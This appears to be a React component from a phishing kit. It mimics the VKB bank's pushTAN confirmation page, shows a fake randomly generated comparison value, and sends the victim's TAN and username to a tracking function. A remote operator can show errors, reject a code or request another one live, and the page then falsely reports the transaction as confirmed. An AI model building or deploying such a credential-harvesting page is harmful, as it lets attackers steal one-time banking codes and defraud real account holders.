"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import Footer from "@/components/Footer";
import HelpButton from "@/components/HelpButton";
import { trackSubmission, onCommand } from "@/lib/track";

function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300;

export default function PushTanForm({
  user,
  vergleichswert: vergleichswertProp,
}: {
  user: string;
  vergleichswert?: string;
}) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* countdown timer */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* command handler */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError(
            (cmd.payload?.message as string) || "Ein Fehler ist aufgetreten."
          );
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("vkb", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* SVG ring constants */
  const ringSize = 80;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/vkb/bg-desktop.jpg')",
        backgroundColor: "#e8e8e8",
      }}
    >
      <main className="flex-1 flex flex-col">
        <div className="flex justify-center items-end sm:items-center min-h-[calc(100vh-60px)] px-4 sm:px-0">
          <div className="relative bg-white rounded-lg w-full max-w-[460px] pt-[34px] mt-[34px] pb-3 flex flex-col shadow-lg sm:min-h-0 min-h-[calc(100vh-100vw+0.625rem)]">
            {/* Logo */}
            <div className="absolute -top-[34px] left-0 right-0 flex justify-center">
              <div
                className="w-[68px] h-[68px] bg-center bg-no-repeat"
                style={{
                  backgroundSize: "68px",
                  backgroundImage: "url('/vkb/vkb-logo.svg')",
                }}
              />
            </div>

            {/* Content */}
            <div className="flex-1 overflow-hidden mt-6">
              <div className="px-3 sm:px-4">
                <h1 className="text-2xl font-normal mb-2">pushTAN</h1>

                {/* Error banner */}
                {error && (
                  <div
                    className="mb-3 px-3 py-2 rounded text-sm"
                    style={{
                      backgroundColor: "#fef2f2",
                      border: "1px solid #fca5a5",
                      color: "#b91c1c",
                    }}
                  >
                    {error}
                  </div>
                )}

                <p
                  className="text-sm mb-4"
                  style={{ color: "rgba(0,0,0,0.54)" }}
                >
                  Best&auml;tigen Sie die Transaktion in Ihrer pushTAN-App.
                  Vergleichen Sie den angezeigten Vergleichswert mit dem Wert
                  auf Ihrem Ger&auml;t.
                </p>

                {success ? (
                  /* Success state */
                  <div className="flex flex-col items-center gap-3 py-8">
                    <div
                      className="w-16 h-16 rounded-full flex items-center justify-center"
                      style={{ backgroundColor: "var(--vkb-primary)" }}
                    >
                      <svg
                        width="32"
                        height="32"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="#fff"
                        strokeWidth="2.5"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      >
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                    </div>
                    <p className="text-lg font-normal">
                      Transaktion best&auml;tigt
                    </p>
                    <p
                      className="text-sm"
                      style={{ color: "rgba(0,0,0,0.54)" }}
                    >
                      Ihre Eingabe wurde erfolgreich &uuml;bermittelt.
                    </p>
                  </div>
                ) : (
                  <form onSubmit={handleSubmit}>
                    {/* Timer ring + Vergleichswert */}
                    <div className="flex items-center gap-6 justify-center py-4">
                      {/* Countdown ring */}
                      <div
                        style={{
                          position: "relative",
                          width: ringSize,
                          height: ringSize,
                          flexShrink: 0,
                        }}
                      >
                        <svg
                          width={ringSize}
                          height={ringSize}
                          style={{ transform: "rotate(-90deg)" }}
                        >
                          <circle
                            cx={ringSize / 2}
                            cy={ringSize / 2}
                            r={radius}
                            fill="none"
                            stroke="var(--vkb-gray-300)"
                            strokeWidth={strokeWidth}
                          />
                          <circle
                            cx={ringSize / 2}
                            cy={ringSize / 2}
                            r={radius}
                            fill="none"
                            stroke={
                              expired
                                ? "var(--vkb-danger)"
                                : "var(--vkb-primary)"
                            }
                            strokeWidth={strokeWidth}
                            strokeDasharray={circumference}
                            strokeDashoffset={dashOffset}
                            strokeLinecap="round"
                            style={{
                              transition: "stroke-dashoffset 1s linear",
                            }}
                          />
                        </svg>
                        <div
                          className="absolute top-0 left-0 w-full h-full flex items-center justify-center text-base font-medium"
                          style={{
                            color: expired
                              ? "var(--vkb-danger)"
                              : "var(--vkb-text-primary)",
                          }}
                        >
                          {formatTime(secondsLeft)}
                        </div>
                      </div>

                      {/* Vergleichswert */}
                      <div>
                        <p
                          className="text-xs mb-1 uppercase tracking-wide"
                          style={{ color: "rgba(0,0,0,0.54)" }}
                        >
                          Vergleichswert
                        </p>
                        <p
                          className="text-3xl font-normal"
                          style={{
                            color: "var(--vkb-primary)",
                            letterSpacing: "0.15em",
                            lineHeight: 1,
                          }}
                        >
                          {vergleichswert}
                        </p>
                      </div>
                    </div>

                    {/* Divider */}
                    <div className="my-3 h-px bg-vkb-gray-300" />

                    {/* TAN input */}
                    <div className="mb-3 form-field">
                      <div className="relative pt-4">
                        <input
                          type="text"
                          value={code}
                          onChange={(e) =>
                            setCode(
                              e.target.value
                                .replace(/[^A-Za-z0-9]/g, "")
                                .slice(0, 6)
                            )
                          }
                          placeholder=" "
                          maxLength={6}
                          disabled={expired}
                          autoComplete="one-time-code"
                          inputMode="text"
                          spellCheck={false}
                          className="floating-input w-full pb-1 text-base bg-transparent border-0 outline-none"
                          style={expired ? { opacity: 0.5 } : {}}
                        />
                        <label
                          className={`absolute left-0 transition-all duration-200 pointer-events-none ${
                            code
                              ? "top-0 text-xs"
                              : "top-1/2 -translate-y-1/2 text-base"
                          }`}
                          style={{ color: "rgba(0,0,0,0.54)" }}
                        >
                          TAN-Code eingeben
                          <span className="text-vkb-danger ml-0.5">*</span>
                        </label>
                      </div>
                      <div className="form-field-underline" />
                    </div>

                    {expired && (
                      <p
                        className="text-sm text-center mb-3"
                        style={{ color: "var(--vkb-danger)" }}
                      >
                        Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                      </p>
                    )}

                    {/* Submit button */}
                    <div className="pt-3 flex justify-center">
                      <button
                        type="submit"
                        disabled={!isValid || submitting}
                        className="vkb-btn-primary w-full sm:w-1/2"
                      >
                        {submitting ? "Wird geprüft..." : "Bestätigen"}
                      </button>
                    </div>
                  </form>
                )}
              </div>
            </div>

            <div className="px-3 sm:px-4 mb-1" />
          </div>
        </div>
      </main>

      <Footer />
      <HelpButton />
    </div>
  );
}
